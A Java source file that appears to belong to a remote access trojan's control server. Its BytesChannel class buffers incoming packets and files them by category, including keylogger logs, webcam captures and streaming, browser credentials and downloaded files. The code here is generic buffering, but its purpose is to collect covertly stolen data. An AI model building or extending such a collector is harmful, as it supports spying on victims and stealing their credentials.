package Server;

import Packets.Identificators.Category;
import Updater.UpdaterInterface;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.Arrays;

public class BytesChannel {
    private final byte id;
    private final UpdaterInterface updaterInterface;
    private ByteBuffer buffer;
    private Category category;
    private String categoryOutputFolder;

    private boolean updateProgressBar = true;
    private static final int DEFAULT_BUFFER_SIZE = 1024 * 1024;

    public BytesChannel(byte id, Category category, UpdaterInterface updaterInterface) {
        this.category = category;
        this.id = id;
        this.updaterInterface = updaterInterface;
        this.buffer = ByteBuffer.allocate(DEFAULT_BUFFER_SIZE);
        configureCategory(category);
    }

    public BytesChannel(byte id, UpdaterInterface updaterInterface) {
        this.id = id;
        this.updaterInterface = updaterInterface;
        this.buffer = ByteBuffer.allocate(DEFAULT_BUFFER_SIZE);
    }

    private void configureCategory(Category category) {
        switch (category) {
            case ZIP_FILE -> {
                categoryOutputFolder = "Downloaded files";
            }
            case KEYLOGGER_LOGS -> {
                categoryOutputFolder = "Keylogger logs";
            }
            case WEBCAM_LOGS -> {
                categoryOutputFolder = "Webcam logs";
                updateProgressBar = false;
            }
            case BROWSER_CREDENTIALS -> {
                categoryOutputFolder = "Browser credentials";
            } case WEBCAM_STREAMING -> {
                updateProgressBar = false;
            }
        }
    }


    public ByteBuffer getBuffer() {
        return buffer;
    }

    public byte getId() {
        return id;
    }

    private JSONObject generateProgressBarJSONInformation(String uuid, byte id, int length, boolean isLastPacket){
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("RESPONSE", "PROGRESS_BAR");
        jsonObject.put("client_id", uuid);
        jsonObject.put("channel_id", id);
        jsonObject.put("read_size", length);
        jsonObject.put("is_last_packet", isLastPacket);
        return jsonObject;
    }

    public byte[] handleMessage(byte[] buf, int offset, int length, byte control) {
        boolean isLastPacket = control == 0x02;
        if (updateProgressBar) updaterInterface.processMessage(generateProgressBarJSONInformation(updaterInterface.getSystemInformation().UUID(), id, length - offset, isLastPacket).toString());
        write(buf, offset + 2, length - 2);
        if (isLastPacket) {
            return flipAndGet();
        }
        return null;
    }


    private void write(byte[] data, int offset, int length) {
        if (buffer.remaining() < length) {
            ByteBuffer newBuffer = ByteBuffer.allocate(buffer.capacity() * 2);
            buffer.flip();
            newBuffer.put(buffer);
            buffer = newBuffer;
        }
        buffer.put(Arrays.copyOfRange(data, offset, offset + length));
    }


    private byte[] flipAndGet() {
        buffer.flip();
        byte[] finalData = new byte[buffer.remaining()];
        buffer.get(finalData);
        return finalData;
    }

    public String getCategoryOutputFolder() {
        return categoryOutputFolder;
    }

    public Category getCategory() {
        return category;
    }
}

